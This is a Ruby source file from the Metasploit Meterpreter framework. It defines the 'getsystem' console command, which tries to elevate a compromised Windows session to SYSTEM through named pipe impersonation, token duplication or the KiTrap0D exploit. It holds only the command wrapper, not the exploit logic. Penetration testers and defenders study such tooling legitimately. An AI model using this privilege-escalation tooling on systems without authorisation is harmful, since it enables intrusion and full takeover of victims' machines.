# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The local privilege escalation portion of the extension.
#
###
class Console::CommandDispatcher::Priv::Elevate

  Klass = Console::CommandDispatcher::Priv::Elevate

  include Console::CommandDispatcher

  ELEVATE_TECHNIQUE_NONE					= -1
  ELEVATE_TECHNIQUE_ANY					= 0
  ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE		= 1
  ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2	= 2
  ELEVATE_TECHNIQUE_SERVICE_TOKENDUP		= 3
  ELEVATE_TECHNIQUE_VULN_KITRAP0D			= 4

  ELEVATE_TECHNIQUE_DESCRIPTION = [ 	"All techniques available",
                    "Service - Named Pipe Impersonation (In Memory/Admin)",
                    "Service - Named Pipe Impersonation (Dropper/Admin)",
                    "Service - Token Duplication (In Memory/Admin)",
                    "Exploit - KiTrap0D (In Memory/User)"
                  ]
  #
  # List of supported commands.
  #
  def commands
    {
      "getsystem" => "Attempt to elevate your privilege to that of local system."
    }
  end

  #
  # Name for this dispatcher.
  #
  def name
    "Priv: Elevate"
  end


  #
  # Attempt to elevate the meterpreter to that of local system.
  #
  def cmd_getsystem( *args )

    technique = ELEVATE_TECHNIQUE_ANY

    desc = ""
    ELEVATE_TECHNIQUE_DESCRIPTION.each_index { |i| desc += "\n\t\t#{i} : #{ELEVATE_TECHNIQUE_DESCRIPTION[i]}" }

    getsystem_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner." ],
      "-t" => [ true, "The technique to use. (Default to \'#{technique}\')." + desc ]
    )

    getsystem_opts.parse(args) { | opt, idx, val |
      case opt
        when "-h"
          print_line( "Usage: getsystem [options]\n" )
          print_line( "Attempt to elevate your privilege to that of local system." )
          print_line( getsystem_opts.usage )
          return
        when "-t"
          technique = val.to_i
      end
    }

    if( technique < 0 or technique >= ELEVATE_TECHNIQUE_DESCRIPTION.length )
      print_error( "Technique '#{technique}' is out of range." );
      return false;
    end

    result = client.priv.getsystem( technique )

    # got system?
    if result[0]
      print_line( "...got system (via technique #{result[1]})." );
    else
      print_line( "...failed to get system." );
    end

    return result
  end

end

end
end
end
end
